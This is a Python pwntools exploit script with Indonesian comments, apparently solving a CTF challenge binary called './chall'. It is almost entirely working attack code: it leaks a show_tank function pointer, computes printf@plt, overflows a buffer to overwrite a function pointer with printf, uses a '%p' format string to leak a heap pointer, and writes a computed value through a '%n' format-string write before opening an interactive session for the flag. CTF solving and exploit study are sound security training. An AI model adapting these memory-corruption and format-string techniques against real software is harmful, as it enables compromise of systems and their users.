#!/usr/bin/env python3
from pwn import *
import re, subprocess, sys

# --- 1. Gunakan variabel string untuk path binary ---
BINARY_PATH = './chall'

# --- 2. Load ELF dari string path ---
e = ELF(BINARY_PATH)

# --- 3. Set context.binary agar pwntools tahu binary-nya (tetap string) ---
context.binary = BINARY_PATH

def get_symbol_offset(name):
    if name in e.symbols:
        return e.symbols[name]
    if name in e.functions:
        return e.functions[name].address
    try:
        out = subprocess.check_output(['objdump', '-t', BINARY_PATH], text=True)
        for line in out.splitlines():
            if name in line and 'F' in line:
                parts = line.split()
                if len(parts) >= 1 and parts[0].isdigit():
                    return int(parts[0], 16)
    except:
        pass
    return None

def get_plt_offset(name):
    if name in e.plt:
        return e.plt[name]
    try:
        out = subprocess.check_output(['objdump', '-d', '-j', '.plt', BINARY_PATH], text=True)
        for line in out.splitlines():
            if f'<{name}@plt>:' in line:
                addr = line.split()[0].strip()
                return int(addr, 16)
    except:
        pass
    return None

# --- Cari offset show_tank ---
show_tank_off = get_symbol_offset('show_tank')
if show_tank_off is None:
    print("[!] Tidak menemukan show_tank. Cari dengan: objdump -t ./chall | grep show_tank")
    print("Masukkan offset hex (tanpa 0x):")
    show_tank_off = int(input("> "), 16)

# --- Cari offset printf@plt ---
printf_plt_off = get_plt_offset('printf')
if printf_plt_off is None:
    printf_plt_off = 0x1080   # dari objdump kamu
    print(f"[!] printf@plt tidak ditemukan, pakai default {hex(printf_plt_off)}")

log.info(f"show_tank offset: {hex(show_tank_off)}")
log.info(f"printf@plt offset: {hex(printf_plt_off)}")
diff = printf_plt_off - show_tank_off

# --- Jalankan proses ---
p = process(BINARY_PATH)

# 1. Ambil telepon pertama
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'name1')

# 2. Insult pertama untuk leak show_tank pointer
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'a')

p.recvuntil(b'Netizen posted:')
p.recvline()
reaction = p.recv(40)          # bot->reaction
view_ptr = p.recv(8)           # bot->view = &show_tank
leaked_show_tank = u64(view_ptr)
printf_plt = leaked_show_tank + diff
log.info(f"Leaked show_tank: {hex(leaked_show_tank)}")
log.info(f"Calculated printf@plt: {hex(printf_plt)}")

# 3. Ambil telepon kedua, overflow timpa phone.post
p.sendlineafter(b'> ', b'1')
payload = b'A'*32 + p64(printf_plt)
p.sendlineafter(b'> ', payload)

# 4. Insult kedua: format string leak heap
p.sendlineafter(b'> ', b'2')
leak_fmt = b'%p ' * 30
p.sendlineafter(b'> ', leak_fmt)

data = p.recvuntil(b"Owi's patience", drop=True)
ptrs = re.findall(rb'0x[0-9a-f]+', data)

heap_ptr = None
heap_pos = None
for idx, ptr_str in enumerate(ptrs):
    val = int(ptr_str, 16)
    if 0x1000 < val < 0x7fffffffffff and (val & 0xfff) == 0:
        heap_ptr = val
        heap_pos = idx + 2
        break

if heap_ptr is None:
    log.error("Heap pointer tidak ditemukan.")
    sys.exit(1)

log.info(f"hp_buzzer address: {hex(heap_ptr)}, posisi: {heap_pos}")

# 5. Hitung siuuu
siuuu = 0x1337 ^ ((heap_ptr >> 12) & 0xffff)
log.info(f"siuuu = {siuuu}")

# 6. Insult ketiga: tulis siuuu ke *hp_buzzer
p.sendlineafter(b'> ', b'2')
write_fmt = f'%{siuuu}c%{heap_pos}$n'.encode()
p.sendlineafter(b'> ', write_fmt)
p.recvuntil(b'patience')

# 7. Insult keempat & kelima
for _ in range(2):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', b'a')
    p.recvuntil(b'patience')

# 8. Dapatkan flag
p.interactive()
